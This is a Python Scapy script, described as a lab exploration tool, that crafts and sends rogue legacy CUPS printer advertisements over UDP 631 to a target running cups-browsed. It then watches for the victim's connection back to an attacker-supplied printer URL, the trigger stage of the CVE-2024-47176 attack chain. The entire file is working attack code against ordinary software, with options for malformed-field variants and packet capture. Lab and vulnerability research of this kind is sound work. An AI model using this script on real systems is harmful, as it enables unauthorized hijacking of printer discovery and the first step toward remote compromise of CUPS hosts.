#!/usr/bin/env python3
"""
cups_attack.py — Scapy-based CUPS insecure printer-discovery exploration tool.

Investigates the trust-boundary flaw in cups-browsed's legacy CUPS browsing
protocol (related to CVE-2024-47176/47177 family) by crafting and sending
printer-advertisement packets over UDP 631, and optionally observing whether
the victim initiates a callback connection to the advertised printer URL.

For authorized lab use only. Do not target systems you do not own or have
explicit permission to test.
"""

import argparse
import logging
import sys
import time
from urllib.parse import urlparse

from scapy.all import IP, UDP, Raw, send, AsyncSniffer, wrpcap


def build_payload(type_flags: str, printer_url: str, location: str, description: str) -> str:
    """
    Construct a legacy CUPS browsing protocol payload.

    Wire format: <type-flags> <printer-state> <printer-url> "<location>" "<description>"

    type_flags  : decimal bitmask the real daemon uses to describe the
                  printer (e.g. "0" = normal printer). Exposed as a CLI
                  argument so Task 4's "malformed/abnormal field" variations
                  can be produced without editing this script.
    printer_url : the rogue IPP/IPPS/HTTP URL being advertised to the victim.
    location    : free-text "printer-location" field.
    description : free-text "printer-info" / description field.
    """
    return f'{type_flags} 3 {printer_url} "{location}" "{description}"\n'


def send_advertisement(target_ip: str, target_port: int, payload: str) -> None:
    """Send one crafted CUPS discovery packet to the victim."""
    packet = IP(dst=target_ip) / UDP(sport=631, dport=target_port) / Raw(load=payload)
    logging.info("Sending crafted CUPS advertisement to %s:%d", target_ip, target_port)
    logging.info("Payload: %s", payload.strip())
    send(packet, verbose=False)
    return packet


def start_callback_listener(victim_ip: str, printer_url: str, iface: str = None) -> AsyncSniffer:
    """
    Start an asynchronous sniffer BEFORE the advertisement is sent, so that a
    fast victim reaction (cups-browsed can connect back within tens of
    milliseconds) is not missed while a blocking sniff() is still being set
    up. Caller is responsible for calling .stop() after the desired window.

    iface: network interface to sniff on (e.g. the Docker bridge, such as
    br-XXXXXXXXXXXX). Required in a Docker-lab setup, since victim<->host
    traffic over the bridge will not appear on the host's default route
    interface. If omitted, Scapy's default interface is used.
    """
    parsed = urlparse(printer_url)
    printer_host_port = parsed.port

    bpf_filter = f"host {victim_ip}"
    if printer_host_port:
        bpf_filter += f" and tcp port {printer_host_port}"

    sniffer_kwargs = {"filter": bpf_filter, "store": True}
    if iface:
        sniffer_kwargs["iface"] = iface

    sniffer = AsyncSniffer(**sniffer_kwargs)
    sniffer.start()
    # Give the sniffer a brief moment to actually attach before we send.
    time.sleep(0.3)
    logging.info(
        "Callback listener armed for %s toward port %s%s.",
        victim_ip, printer_host_port, f" on {iface}" if iface else "",
    )
    return sniffer


def collect_callback(sniffer: AsyncSniffer, timeout: int):
    """Let the armed sniffer run for `timeout` seconds, then stop and report."""
    logging.info("Watching for victim callback for %ds...", timeout)
    time.sleep(timeout)
    packets = sniffer.stop()

    if packets:
        logging.info("[+] Victim callback detected: %d matching packet(s) captured.", len(packets))
        for pkt in packets:
            logging.info("    %s", pkt.summary())
    else:
        logging.warning("[-] No callback observed from victim within timeout window.")

    return packets


def main():
    parser = argparse.ArgumentParser(
        description="CUPS insecure printer-discovery exploration tool (educational / lab use only)"
    )
    parser.add_argument("-t", "--target", required=True, help="Victim IP address (cups-browsed host)")
    parser.add_argument("-p", "--port", type=int, default=631, help="Victim UDP port (default: 631)")
    parser.add_argument("-u", "--url", required=True, help="Rogue IPP/IPPS printer URL to advertise")
    parser.add_argument("--type-flags", default="0", help="CUPS browse type-flags field (default: 0)")
    parser.add_argument("--location", default="Lab Test Location", help="Advertised printer-location field")
    parser.add_argument("--description", default="Lab Test Printer", help="Advertised printer description field")
    parser.add_argument("-o", "--output", help="Path to export sent (and, if --watch, received) packets as PCAP")
    parser.add_argument(
        "--watch", type=int, metavar="SECONDS", default=0,
        help="After sending, sniff for this many seconds for a victim callback to the advertised printer URL",
    )
    parser.add_argument(
        "--iface", help="Interface to sniff on for --watch (e.g. Docker bridge br-XXXXXXXXXXXX)",
    )
    parser.add_argument("--log-file", help="Optional path to also write logs to a file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable debug-level logging")

    args = parser.parse_args()

    log_level = logging.DEBUG if args.verbose else logging.INFO
    handlers = [logging.StreamHandler(sys.stdout)]
    if args.log_file:
        handlers.append(logging.FileHandler(args.log_file))
    logging.basicConfig(level=log_level, format="%(asctime)s [%(levelname)s] %(message)s", handlers=handlers)

    captured = []
    try:
        sniffer = None
        if args.watch > 0:
            sniffer = start_callback_listener(args.target, args.url, args.iface)

        payload = build_payload(args.type_flags, args.url, args.location, args.description)
        sent_packet = send_advertisement(args.target, args.port, payload)
        captured.append(sent_packet)

        if sniffer is not None:
            captured.extend(collect_callback(sniffer, args.watch))

        if args.output:
            wrpcap(args.output, captured)
            logging.info("Exported %d packet(s) to %s", len(captured), args.output)

    except PermissionError:
        logging.error("Permission denied — raw packet sending/sniffing requires sudo/root.")
        sys.exit(1)
    except Exception as e:
        logging.error("Error during attack run: %s", e)
        sys.exit(1)


if __name__ == "__main__":
    main()